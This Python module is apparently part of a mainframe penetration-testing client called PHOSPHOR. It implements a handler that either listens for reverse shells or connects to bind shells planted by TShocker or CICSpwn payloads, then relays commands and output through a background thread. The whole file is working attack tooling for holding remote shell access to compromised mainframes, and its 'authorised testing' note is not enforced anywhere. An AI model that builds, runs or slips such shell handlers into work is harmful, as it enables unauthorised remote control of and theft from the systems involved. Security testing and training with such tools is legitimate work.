"""In-client shell channel for TShocker / CICSpwn reverse & bind shells.

Two modes, so you never leave PHOSPHOR to catch a shell:

* **listen** (reverse shell) - PHOSPHOR binds a local port and waits; the payload you
  uploaded (TShocker JCL/REXX, or a CICSpwn ``-s reverse_tso``/``reverse_unix`` submit)
  connects back to it. This is the "connect straight from the client" you asked for.
* **connect** (bind shell) - PHOSPHOR connects to a port the payload opened on the
  mainframe (e.g. a TShocker bind REXX on ``--port``).

Runs on a background thread and exposes a thread-safe line buffer the UI polls, plus a
``send()``. Authorised testing / GIBSON training only.
"""
from __future__ import annotations

import socket
import threading
import time
from typing import List, Optional, Tuple


def _split_hostport(s: str, default_port: int = 4444) -> Tuple[str, int]:
    s = (s or "").strip()
    if ":" in s:
        h, _, p = s.rpartition(":")
        try:
            return h or "0.0.0.0", int(p)
        except ValueError:
            return s, default_port
    return s, default_port


class ShellSession:
    def __init__(self, mode: str, endpoint: str):
        """mode = 'listen' (reverse) or 'connect' (bind). endpoint = 'host:port'."""
        self.mode = "listen" if mode.startswith("l") else "connect"
        self.host, self.port = _split_hostport(endpoint)
        self._sock: Optional[socket.socket] = None
        self._conn: Optional[socket.socket] = None
        self._lines: List[str] = []
        self._lock = threading.Lock()
        self._alive = False
        self._connected = False
        self._thread: Optional[threading.Thread] = None

    # --- lifecycle ---
    def start(self) -> None:
        self._alive = True
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def _log(self, msg: str) -> None:
        with self._lock:
            self._lines.append(msg)

    def _run(self) -> None:
        try:
            if self.mode == "listen":
                self._sock = socket.socket()
                self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self._sock.bind((self.host if self.host not in ("", "0.0.0.0") else "0.0.0.0", self.port))
                self._sock.listen(1)
                self._log(f"[*] listening on {self.host}:{self.port} - waiting for the shell to connect back")
                self._sock.settimeout(1.0)
                while self._alive and self._conn is None:
                    try:
                        self._conn, addr = self._sock.accept()
                        self._log(f"[+] shell connected from {addr[0]}:{addr[1]}")
                    except socket.timeout:
                        continue
            else:
                self._log(f"[*] connecting to bind shell {self.host}:{self.port}")
                self._conn = socket.create_connection((self.host, self.port), timeout=5)
                self._log(f"[+] connected to {self.host}:{self.port}")
            if self._conn is None:
                return
            self._connected = True
            self._conn.settimeout(0.5)
            while self._alive:
                try:
                    data = self._conn.recv(4096)
                    if not data:
                        self._log("[-] shell closed")
                        break
                    for line in data.decode("utf-8", "replace").splitlines():
                        self._log(line)
                except socket.timeout:
                    continue
                except OSError:
                    break
        except Exception as e:
            self._log(f"[!] shell error: {e}")
        finally:
            self._connected = False

    def send(self, text: str) -> bool:
        if self._conn is None:
            return False
        try:
            self._conn.sendall((text.rstrip("\n") + "\n").encode("utf-8"))
            return True
        except OSError:
            return False

    def drain(self) -> List[str]:
        """Return and clear buffered output lines (UI polls this)."""
        with self._lock:
            out, self._lines = self._lines, []
        return out

    @property
    def connected(self) -> bool:
        return self._connected

    @property
    def alive(self) -> bool:
        return self._alive

    def stop(self) -> None:
        self._alive = False
        for s in (self._conn, self._sock):
            try:
                if s:
                    s.close()
            except Exception:
                pass
        self._conn = self._sock = None
        self._connected = False
